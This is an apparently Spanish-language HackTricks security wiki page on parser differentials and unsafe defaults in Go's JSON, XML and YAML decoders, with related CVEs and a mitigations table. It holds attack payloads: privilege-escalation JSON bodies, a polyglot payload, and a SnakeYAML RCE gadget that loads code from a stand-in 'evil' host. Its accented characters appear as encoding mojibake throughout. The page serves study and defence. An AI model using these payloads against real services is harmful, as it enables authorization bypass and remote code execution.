# JSON, XML & Yaml Hacking & Problemas

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

Se detectaron los siguientes problemas en el JSON de Go aunque tambi√©n podr√≠an estar presentes en otros lenguajes. Estos problemas fueron publicados en [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

Los parsers JSON, XML y YAML de Go tienen una larga serie de inconsistencias y valores predeterminados inseguros que pueden ser abusados para **omitir la autenticaci√≥n**, **escalar privilegios** o **exfiltrar datos sensibles**.


### (Un)Marshaling de datos inesperados

El objetivo es explotar structs que permiten a un atacante leer/escribir campos sensibles (p.ej., `IsAdmin`, `Password`).

- Example Struct:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- Vulnerabilidades comunes

1. **Missing tag** (sin etiqueta = el campo sigue siendo analizado por defecto):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **Uso incorrecto de `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // ‚ùå wrong
}
```
Payload:
```json
{"-": true}
```
‚úîÔ∏è Forma correcta de evitar que un campo sea (des)serializado:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Diferencias entre parsers

El objetivo es eludir la autorizaci√≥n explotando c√≥mo diferentes parsers interpretan el mismo payload de forma distinta, como en:
- CVE-2017-12635: Apache CouchDB elusi√≥n mediante claves duplicadas
- 2022: Zoom 0-click RCE mediante inconsistencia del parser XML
- GitLab 2025: elusi√≥n de SAML mediante peculiaridades de XML


**1. Campos duplicados:**
El `encoding/json` de Go toma el **√∫ltimo** campo.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
Otros parsers (p. ej., Java‚Äôs Jackson) pueden tomar el **primero**.

**2. Insensibilidad a may√∫sculas/min√∫sculas:**
Go es insensible a may√∫sculas/min√∫sculas:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
Incluso los trucos de Unicode funcionan:
```go
json.Unmarshal([]byte(`{"a‚Ñ™tion≈ø": "bypass"}`), &req)
```
**3. Cross-service mismatch:**
Imagina:
- Proxy escrito en Go
- servicio AuthZ escrito en Python

Attacker env√≠a:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python ve `UserAction`, lo permite
- Go ve `AdminAction`, lo ejecuta


### Confusi√≥n de formatos de datos (Polyglots)

El objetivo es explotar sistemas que mezclan formatos (JSON/XML/YAML) o que fallan abiertos ante errores del parser como:
- **CVE-2020-16250**: HashiCorp Vault analiz√≥ JSON con un parser XML despu√©s de que STS devolviera JSON en lugar de XML.

El atacante controla:
- La cabecera `Accept: application/json`
- Control parcial del cuerpo JSON

El parser XML de Go lo analiz√≥ **de todos modos** y confi√≥ en la identidad inyectada.

- Payload creado:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
Resultado:
- **Go JSON** parser: `Action_2` (insensible a may√∫sculas + el √∫ltimo prevalece)
- **YAML** parser: `Action_1` (distingue entre may√∫sculas y min√∫sculas)
- **XML** parser: analiza `"Action_3"` dentro de la cadena

---

## Vulnerabilidades notables de parsers (2023-2025)

> Los siguientes problemas explotables p√∫blicamente muestran que el parsing inseguro es un problema multilenguaje ‚Äî no solo un problema de Go.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* Afecta a: `org.yaml:snakeyaml` < **2.0** (usado por Spring-Boot, Jenkins, etc.).
* Causa ra√≠z: `new Constructor()` deserializa **clases Java arbitrarias**, lo que permite cadenas de gadgets que culminan en ejecuci√≥n remota de c√≥digo.
* PoC de una l√≠nea (abrir√° la calculadora en el host vulnerable):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Soluci√≥n / Mitigaci√≥n:
1. **Actualizar a ‚â•2.0** (usa `SafeLoader` por defecto).
2. En versiones antiguas, use expl√≠citamente `new Yaml(new SafeConstructor())`.

### libyaml Double-Free (CVE-2024-35325)

* Afecta a: `libyaml` ‚â§0.2.5 (biblioteca C utilizada por muchos bindings de lenguaje).
* Problema: Llamar a `yaml_event_delete()` dos veces provoca un double-free que los atacantes pueden convertir en DoS o, en algunos escenarios, en explotaci√≥n del heap.
* Estado: El upstream lo rechaz√≥ como ‚ÄúAPI misuse‚Äù, pero las distribuciones Linux enviaron **0.2.6** parcheada que libera el puntero a null de forma defensiva.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* Afecta a: Tencent **RapidJSON** antes del commit `8269bc2` (<1.1.0-patch-22).
* Bug: En `GenericReader::ParseNumber()` aritm√©tica sin comprobaci√≥n permite a los atacantes crear literales num√©ricos enormes que se desbordan y corrompen el heap ‚Äî en √∫ltima instancia permitiendo escalada de privilegios cuando el grafo de objetos resultante se usa para decisiones de autorizaci√≥n.

---

### üîê Mitigaciones (Actualizado)

| Riesgo                              | Soluci√≥n / Recomendaci√≥n                                  |
|-------------------------------------|------------------------------------------------------------|
| Campos desconocidos (JSON)          | `decoder.DisallowUnknownFields()`                          |
| Campos duplicados (JSON)            | ‚ùå Sin soluci√≥n en la stdlib ‚Äî validar con [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| Coincidencia insensible a may√∫sculas (Go) | ‚ùå Sin soluci√≥n ‚Äî validar struct tags + pre-canonicalizar la entrada |
| Datos basura XML / XXE              | Usar un parser reforzado (`encoding/xml` + `DisallowDTD`)  |
| Claves desconocidas en YAML         | `yaml.KnownFields(true)`                                   |
| **Deserializaci√≥n insegura de YAML** | Usar SafeConstructor / actualizar a SnakeYAML ‚â•2.0         |
| libyaml ‚â§0.2.5 double-free          | Actualizar a **0.2.6** o a una release parcheada por la distro |
| RapidJSON <patched commit           | Compilar contra la √∫ltima versi√≥n de RapidJSON (‚â• julio de 2024) |

## See also

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## References

- Baeldung ‚Äì ‚ÄúResolving CVE-2022-1471 With SnakeYAML 2.0‚Äù
- Ubuntu Security Tracker ‚Äì CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
